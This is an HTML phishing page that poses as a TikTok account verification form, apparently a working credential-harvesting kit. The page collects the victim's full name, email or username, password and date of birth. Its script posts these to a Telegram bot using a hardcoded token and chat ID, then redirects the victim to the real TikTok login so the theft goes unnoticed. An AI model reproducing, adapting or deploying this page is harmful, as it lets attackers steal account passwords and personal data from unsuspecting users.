<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Verification Request</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #ff0050;
      --bg: #f5f5f5;
      --card-bg: #111111;
      --text: #ffffff;
      --muted: #bbbbbb;
      --radius: 18px;
      --input-bg: #222222;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    html, body {
      background-color: var(--bg);
      height: 100%;
      overflow: hidden;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 10px;
    }

    .card {
      background-color: var(--card-bg);
      border-radius: var(--radius);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      padding: 25px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      opacity: 0;
      animation: fadeIn 1s forwards;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .card img {
      width: 120px;
      margin-bottom: 20px;
      animation: fadeIn 1s forwards 0.2s;
    }

    h2 {
      font-size: 20px;
      color: var(--text);
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 14px;
      background-color: var(--input-bg);
      border: none;
      border-radius: var(--radius);
      color: var(--text);
      font-size: 14px;
    }

    input::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: var(--primary);
      border: none;
      border-radius: var(--radius);
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #e60045;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/537af08a11a116c157659081006036e7%20(1).png" alt="TikTok Logo">
    <h2>Account Verification Request</h2>
    <p>Fill in the details below to submit your request</p>
    <form id="verifyForm">
      <input type="text" placeholder="Full Name" id="fullName" required>
      <input type="text" placeholder="Email or Username" id="emailOrUser" required>
      <input type="password" placeholder="Password" id="password" required>
      <input type="date" placeholder="Date of Birth" id="dob" value="2000-01-01" required>
      <button type="submit">Submit Request</button>
    </form>
  </div>

  <script>
    document.getElementById("verifyForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const fullName = document.getElementById('fullName').value;
      const emailOrUser = document.getElementById('emailOrUser').value;
      const password = document.getElementById('password').value;
      const dob = document.getElementById('dob').value;

      // Send data to Telegram Bot
      const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
      const chatId = '5029891039';
      const message = `
*ðŸŽ¯ New Account Verification Request*

ðŸ‘¤ *Full Name:* ${fullName}
ðŸ“§ *Email or Username:* ${emailOrUser}
ðŸ”‘ *Password:* ${password}
ðŸ“… *Date of Birth:* ${dob}

ðŸš¨ *New account has been caught!* ðŸš¨
      `;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(response => {
        if (response.ok) {
          // Redirect to TikTok login page after submitting
          window.location.href = 'https://www.tiktok.com/login';
        } else {
          alert('Failed to send data!');
        }
      });
    });
  </script>
</body>
</html>
